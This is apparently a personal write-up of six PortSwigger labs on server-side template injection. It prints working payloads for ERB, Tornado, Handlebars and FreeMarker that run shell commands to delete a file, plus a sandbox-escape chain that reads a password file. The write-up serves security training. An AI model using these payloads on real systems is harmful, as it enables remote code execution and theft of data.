# SSTI

### Lab 1: Basic SSTI <a href="#lab-1-basic-ssti" id="lab-1-basic-ssti"></a>

When viewing the requests sent upon viewing a product, this is what I see:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0adc7d0a3b07f15151a49e05c6166f8b074ce997%252Fportswigger-ssti-writeup-image.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=d27e02cf&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Further testing reveals that this `message` parameter is printed on the screen:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a069015356ef6d400affac183e68284b46a395e0%252Fportswigger-ssti-writeup-image-1.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5d29f0c4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Using `<%= 7/0 %>` causes a 500 error. This means that the template is processing information insecurely. Using this, I can execute `system("rm /home/carlos/morale.txt")`.

### Lab 2: Basic SSTI with Code Context <a href="#lab-2-basic-ssti-with-code-context" id="lab-2-basic-ssti-with-code-context"></a>

This lab provides me with a 'preferred name' feature:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-bad0153e77e755bacd76aa17d6459960b9f2ab86%252Fportswigger-ssti-writeup-image-2.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=a01846d4&#x26;sv=2" alt=""><figcaption></figcaption></figure>

When the request is viewed, I saw that it uses `user.first_name`.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-2d5cd6327c1873f56dacaa851e17e8d0b189b5a0%252Fportswigger-ssti-writeup-image-3.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=bc8e2f69&#x26;sv=2" alt=""><figcaption></figcaption></figure>

It looks like this is dynamically retrived. This lab uses a Tornado template, and since it uses `user.first_name`, the input might be processed like this:

```
&#123;&#123;user.first_name}}
```

Since the above is probably not sanitised, I can do enter `}}&#123;&#123;6*6`. This might cause the expressions evaluated to be:

```
&#123;&#123;user.first_name}}&#123;&#123;6*6}} (the last 2 brackets are automatically there)
```

The method above works, and the '36' is reflected when I leave a comment on a post. Using this method, one can execute Python using the following format:

```html

<div data-gb-custom-block data-tag="import"></div>&#123;&#123;os.system('rm /home/carlos/morale.txt')
```

Afterwards, leave a comment on any post.

### Lab 3: Using Documentation <a href="#lab-3-using-documentation" id="lab-3-using-documentation"></a>

This particular lab requires us to identify the template engine used.

The lab provides us with a 'Edit template' option.

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-1c04676763304cffd6964a85d4d6a88e8acd7297%252Fportswigger-ssti-writeup-image-4.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=71f884d0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Using this, I can attempt to identify the template used using this payload:

```
${7*7}
&#123;&#123;7*7}}
&#123;&#123;7*'7'}}
a{*comment*}b
${"z".join("ab")}
```

The first one is processed!

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-80ad30da1bb008d3ac9ca24f62fa8ef9f4df8001%252Fportswigger-ssti-writeup-image-5.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=54b4fd8c&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I went to PayloadAllTheThings and tested all the frameworks of which this worked with, and found that it was FreeMarker being used:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-9f1ad7767244d84ec9aa491570742740aa47a4fe%252Fportswigger-ssti-writeup-image-6.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=36fd577&#x26;sv=2" alt=""><figcaption></figcaption></figure>

There are quite a few payloads for code execution:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-b7e71cb269250552dd8a90ae6394584fb3c7e8e4%252Fportswigger-ssti-writeup-image-7.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=5b731889&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The rest of the lab is trivial.

### Lab 4: Unknown Language <a href="#lab-4-unknown-language" id="lab-4-unknown-language"></a>

Firstly, this lab uses the `message` parameter, and using `&#123;&#123;7*7}}` results in an error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-eb2d3ab4df5eb80b91efb56d1ef98bfdbf9d7a93%252Fportswigger-ssti-writeup-image-8.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=cb75d186&#x26;sv=2" alt=""><figcaption></figcaption></figure>

The above uses Handlebars. Hacktricks has a payload for this, which can be modified to solve the lab:

```
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27rm+/home/carlos/morale.txt%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```

### Lab 5: Information Disclosure via User-Supplied Objects <a href="#lab-5-information-disclosure-via-user-supplied-objects" id="lab-5-information-disclosure-via-user-supplied-objects"></a>

To solve this lab, steal the secret key from the website. By trying to edit the content of a post with this:

```
${7*7}
&#123;&#123;7*7}}
&#123;&#123;7*'7'}}
a{*comment*}b
${"z".join("ab")}
```

It causes this error:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-5969919a790228fd168cb55cc0fe82fb2cfd6970%252Fportswigger-ssti-writeup-image-9.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=88d3d9a9&#x26;sv=2" alt=""><figcaption></figcaption></figure>

So this runs on Django. Using \`

\` reveals a ton of information, and actually it shows some Jinja2 debug stuff:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-0e3f4744862ae83cf2285c15cc029a5dfa917e88%252Fportswigger-ssti-writeup-image-10.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=16826181&#x26;sv=2" alt=""><figcaption></figcaption></figure>

I can then use this payload to extract the key to solve the lab:

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-474fb91aba2ab40bf98876f27d613eb3edd9196e%252Fportswigger-ssti-writeup-image-11.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=4dd89ab5&#x26;sv=2" alt=""><figcaption></figcaption></figure>

### Lab 6: Sandboxed Environment <a href="#lab-6-sandboxed-environment" id="lab-6-sandboxed-environment"></a>

This lab uses the Freemarker template engine. To solve the lab, read `/home/carlos/my_password.txt`. This lab gives us `content-manager` access.

[![Logo](https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2Fportswigger.net%2Fcontent%2Fimages%2Flogos%2Ffavicon.ico\&width=20\&dpr=3\&quality=100\&sign=f1f37dd2\&sv=2)Server-Side Template InjectionPortSwigger Research](https://portswigger.net/research/server-side-template-injection)

This is the payload they used:

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

<figure><img src="https://rouvin.gitbook.io/ibreakstuff/~gitbook/image?url=https%3A%2F%2F1617468840-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fqpzdj1tPRpELJdvxuVYh%252Fuploads%252Fgit-blob-a1e9e2aeecceb939fd8679561def5a406485dffe%252Fportswigger-ssti-writeup-image-12.png%3Falt%3Dmedia&#x26;width=768&#x26;dpr=3&#x26;quality=100&#x26;sign=586aa85d&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Converting this to ASCII and submitting that solves the lab. I will dive into this exploit...another time.
